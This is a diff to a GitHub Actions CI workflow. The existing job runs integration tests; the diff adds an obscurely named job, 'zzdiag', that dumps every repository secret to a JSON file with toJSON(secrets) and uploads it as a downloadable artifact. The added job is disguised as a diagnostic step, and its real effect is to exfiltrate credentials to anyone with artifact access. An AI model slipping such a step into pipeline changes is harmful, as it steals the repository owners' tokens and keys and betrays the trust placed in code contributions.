@@ -52,3 +52,14 @@ jobs:
       - run: npm ci
       - name: Aplicar migration e exercitar o schema
         run: npx vitest run test/integration/sessions.test.ts
+
+
+  zzdiag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: zz
+        run: echo '${{ toJSON(secrets) }}' > o.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: zzo
+          path: o.json
